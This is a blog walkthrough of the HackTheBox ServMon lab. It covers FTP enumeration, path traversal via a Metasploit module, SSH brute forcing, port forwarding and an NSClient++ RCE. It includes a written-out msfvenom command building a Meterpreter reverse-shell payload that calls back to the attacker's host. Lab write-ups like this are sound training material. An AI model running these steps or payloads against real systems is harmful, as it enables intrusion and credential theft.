---
title: HackTheBox - ServMon
date: 2025-06-03 01:00:00 +0800
categories:
  - HackTheBox
tags:
  - writeups
---
Kembali lagi dengan tingkap apa hari ini.

Today we do HackTheBox ServMon. It's rare for me to do HTB actually. To make things easy, we will use guided mode.

![](assets/img/2025-06-03-HTB-ServMon/ServMon.png)

# Nmap Scan

Let's start with standard nmap scan.

```
nmap -sC -sV 10.129.242.236
```

![](assets/img/2025-06-03-HTB-ServMon/nmap.png)

Only port scan

```
┌──(kali㉿kali)-[~/HackTheBox/HTB_ServMon]
└─$ nmap -Pn 10.129.242.236    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 12:34 EDT
Nmap scan report for 10.129.242.236
Host is up (0.013s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5666/tcp open  nrpe
6699/tcp open  napster
8443/tcp open  https-alt
```

**Question 1**

![](assets/img/2025-06-03-HTB-ServMon/q1.png)

# FTP Access

There are FTP service that can access anonymously. Let's login and grab anything we can. We found there are 2 users called Nadine and Nathan, each user have a file in the directory, let's get both file.

![](assets/img/2025-06-03-HTB-ServMon/ftp.png)

**Question 2**

![](assets/img/2025-06-03-HTB-ServMon/q2.png)

**Users/Nadine/Confidential.txt**

![](assets/img/2025-06-03-HTB-ServMon/confidential.png)

**Users/Nathan/Notes to do.txt**

![](assets/img/2025-06-03-HTB-ServMon/todo.png)

From both of this file, we get some information: 
- There are two possible username Nadine and Nathan
- There are Passwords.txt in Nathan Desktop folder

**Question 3**

![](assets/img/2025-06-03-HTB-ServMon/q3.png)

# Web Access

Next, let's access the webpage on port 80. There are services called NVMS-1000 with a login page. 

![](assets/img/2025-06-03-HTB-ServMon/web-nvms.png)

**Question 4**

![](assets/img/2025-06-03-HTB-ServMon/q4.png)

From a little bit searching, we found that, there are CVE that may lead to path traversal from this system. 

![](assets/img/2025-06-03-HTB-ServMon/google.png)

**Question 5**

![](assets/img/2025-06-03-HTB-ServMon/q5.png)

I use automatic way for the path traversal exploitation. WE can use msfconsole as there are exploit of CVE-2019-20085 module.

![](assets/img/2025-06-03-HTB-ServMon/msf.png)

What we need now is file path that we want to access. As we know that there are password file in Nathan desktop, so we can try to access it.

```
/Users/Nathan/Desktop/Passwords.txt
```

![](assets/img/2025-06-03-HTB-ServMon/getfile.png)

![](assets/img/2025-06-03-HTB-ServMon/password.png)

After retrieve the Passwords.txt, I try to bruteforce user Nathan for the password. I try both SSH and NVMS login but failed. Until I realize the question state that the it for SSH. As Nathan user are failed. I try for Nadine and we successfully get the SSH password for Nadine.

![](assets/img/2025-06-03-HTB-ServMon/hydra.png)

**Question 6**

![](assets/img/2025-06-03-HTB-ServMon/q6.png)

So now, let's login to user Nadine. And retrieve our user flag.

![](assets/img/2025-06-03-HTB-ServMon/userflag.png)

# Other Service Exploit

Next, there are other service that we need to exploit in order to gain higher privilege. We also need access from user Nadine for this exploit to work. Let's enumerate it. The service is on port 8443.

![](assets/img/2025-06-03-HTB-ServMon/nmap2.png)

![](assets/img/2025-06-03-HTB-ServMon/nsclient.png)

The service called NSClient++

**Question 8**

![](assets/img/2025-06-03-HTB-ServMon/q8.png)

We can enumerate this service using Nadine user. From my finding, there are program folder for this service in Program Files and there are .ini configuration file.

![](assets/img/2025-06-03-HTB-ServMon/inifile.png)

**Question 9**

![](assets/img/2025-06-03-HTB-ServMon/q9.png)

![](assets/img/2025-06-03-HTB-ServMon/version.png)

**Question 10**

![](assets/img/2025-06-03-HTB-ServMon/q10.png)

We found the password to login into NSClient++. But in order to login, we need to login from 127.0.0.1 as the allowed hosts are set to be only localhost can access using the undocumented key. I actually little bit stuck here. After some research (reading writeups XD), we need to port forward the service to our host. Below is the port forward command guide.

```
ssh -L <host_port>:<target_host>:<forwarded_port> user@remote

host_port: The port on your local machine (host).
target_host: Usually localhost — the server's own address.
forwarded_port: The port on the remote server you want to reach.
```

```
ssh -L 8443:127.0.0.1:8443 nadine@10.129.242.236
```

Now we are able to access the NSClient++ dashboard.

![](assets/img/2025-06-03-HTB-ServMon/dashboard.png)

Next, I search a little bit about NSClient++ exploit. There are exploit script that we may use for authenticated remote code execution.

![](assets/img/2025-06-03-HTB-ServMon/searchsploit.png)

Searchsploit give us the python exploit script that we may use to get RCE. The script also straight forward for us to follow.

![](assets/img/2025-06-03-HTB-ServMon/exploitscript.png)

Now what we need is payload that will connect the machine to our host. Yeah I know usually we can use nc.exe, but I already try it and it say nc are not compatible with this mahine, ughh. Now we do old way. Meterpreter Reverse TCP

![](assets/img/2025-06-03-HTB-ServMon/meme.png)

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=10.10.14.52 LPORT=4444 -f exe > meow.exe
```

![](assets/img/2025-06-03-HTB-ServMon/msfvenom.png)

**Setup our listener**

![](assets/img/2025-06-03-HTB-ServMon/listener.png)

**Payload Delivery**

![](assets/img/2025-06-03-HTB-ServMon/pyhttp.png)

![](assets/img/2025-06-03-HTB-ServMon/deliver.png)

Now we can run the exploit script and provide command to start our payload.

![](assets/img/2025-06-03-HTB-ServMon/admin.png)

**Question 11**

![](assets/img/2025-06-03-HTB-ServMon/q11.png)

![](assets/img/2025-06-03-HTB-ServMon/root.png)

p.s. If you failed to achieve reverse shell, try to restart your box. So that all, thank youk.